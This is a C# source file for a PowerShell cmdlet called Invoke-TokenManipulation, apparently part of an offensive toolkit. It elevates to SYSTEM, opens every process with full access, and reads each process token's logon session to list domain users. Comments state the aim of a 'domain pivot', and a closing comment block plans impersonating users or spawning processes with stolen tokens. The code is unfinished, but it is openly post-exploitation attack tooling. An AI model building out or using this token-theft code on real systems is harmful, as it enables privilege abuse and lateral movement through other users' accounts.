using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using TurtleToolKitManaged;
using TurtleToolKitImpersonate;
using TurtleToolKitOutputs;
using System.Management.Automation;
using System.Runtime.InteropServices;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "TokenManipulation")] // <- seeting cmdlet name and verbs
    [Alias("INVTKNM")] //<- cmdlet alias
    public class InvokeTokenManipulation : Cmdlet
    {
        public static List<TokenObjects> tokensList;


        protected override void BeginProcessing(){
            base.BeginProcessing();
            tokensList = new List<TokenObjects>();
        }
        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            EnumTokens();
            Console.WriteLine(tokensList.Count);
            return;
        }
        protected override void EndProcessing() { base.EndProcessing(); }
        protected override void StopProcessing() { base.StopProcessing(); }

        /// 
        public static bool GetTokenInformation(IntPtr hToken)
        {
            uint TokenStatusLength = 0;
            bool Result;
            // first call gets lenght of TokenInformation
            Result = Win32.GetTokenInformation(hToken, Win32.TOKEN_INFORMATION_CLASS.TokenStatistics, IntPtr.Zero, TokenStatusLength, out TokenStatusLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((int)TokenStatusLength);
            Result = Win32.GetTokenInformation(hToken, Win32.TOKEN_INFORMATION_CLASS.TokenStatistics, TokenInformation, TokenStatusLength, out TokenStatusLength);
            if (!Result)
            {
                Console.WriteLine("Error getting token stats");
                return false;
            }
            // get logon session data
            Win32.TOKEN_STATISTICS TokenStats = (Win32.TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(Win32.TOKEN_STATISTICS));
            IntPtr LuidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Win32.TOKEN_STATISTICS)));
            Marshal.StructureToPtr(TokenStats.AuthenticationId, LuidPtr, false);
            IntPtr LogonSessionDataPTr = IntPtr.Zero;
            uint res = Win32.LsaGetLogonSessionData(LuidPtr, out LogonSessionDataPTr);
            if (res != 0 && LogonSessionDataPTr == IntPtr.Zero)
            {
                Console.WriteLine("error getting lsa logon session data");
                return false;
            }
            Win32.SECURITY_LOGON_SESSION_DATA LogonSessonData = (Win32.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(LogonSessionDataPTr, typeof(Win32.SECURITY_LOGON_SESSION_DATA));
            if (LogonSessonData.Username.Buffer != IntPtr.Zero && LogonSessonData.LoginDomain.Buffer != IntPtr.Zero)
            {
                string UserName = Marshal.PtrToStringUni(LogonSessonData.Username.Buffer, LogonSessonData.Username.Length/2);
                string UserDomain = Marshal.PtrToStringUni(LogonSessonData.LoginDomain.Buffer, LogonSessonData.LoginDomain.Length / 2);
                //Console.WriteLine(UserName);
                // disregard computer account all we care about is domain users really
                if (UserName == Environment.MachineName.ToString() + "$")
                {
                    Console.WriteLine("Skipping computer account");
                    return false;
                }
                // create return object?
                //Console.WriteLine("{0} -> {1} -> {2}", UserDomain, UserName, LogonSessonData.LogonType);
                // we only care for interactive logon tokens since we want domain pivot
            }

            return true;
        }


        public static bool EnumTokens()
        {
            if (Impersonator.ElevateToSystem() != 0)
            {
                Console.WriteLine("Failed to impersonate system token...needed for token enumertation");
                return false;
            }
            // continue with token enum
            Process[] procs = Process.GetProcesses();
            IntPtr hToken;
            IntPtr hProcess;
            foreach (Process p in procs)
            {
                if (p.ProcessName != "csrss" && p.Id != 0 && p.ProcessName != "system") 
                {
                    Console.WriteLine("{0} -> {1}", p.Id, p.ProcessName);
                    // get primary token
                    hProcess = Win32.OpenProcess((uint)Win32.ProcessAccessFlags.All, true, p.Id);
                    if (hProcess == IntPtr.Zero)
                    {
                        Win32.CloseHandle(hProcess);
                        Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                        continue;
                    }

                    if (!Win32.OpenProcessToken(hProcess, Win32.TOKEN_ALL_ACCESS, out hToken))
                    {
                        Win32.CloseHandle(hProcess);
                        Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                        continue;
                    }
                    if (hToken == IntPtr.Zero)
                    {
                        Win32.CloseHandle(hProcess);
                        Console.WriteLine("Failed to get handle to token");
                        continue;
                    }
                    //Get-TokenInformation
                    //TokenObjects t = new TokenObjects();
                    //t.processHandle = hProcess;
                    //t.tokenHandle = hToken;
                    //tokensList.Add(t);
                    GetTokenInformation(hToken);
                    Win32.CloseHandle(hToken);
                    Win32.CloseHandle(hProcess);
                }
            }

            Impersonator.RevokePrivs();
            return true;
        }
    }
}

/*
Process[] procs = Process.GetProcesses();
foreach (Process p in procs)
{
    // Get System
    // Get-PrimaryToken for all process
    // open Process
    // open process token
    // close handle
    //return  obj that contains hProcess and hToken

    // Get-TokenInformation

    // then for that process
    // get all thread tokens for each thread

    // huge array of tokens that gets filtered to be unique tokens
    // create process with token
    // or invoke impersonate user
}
*/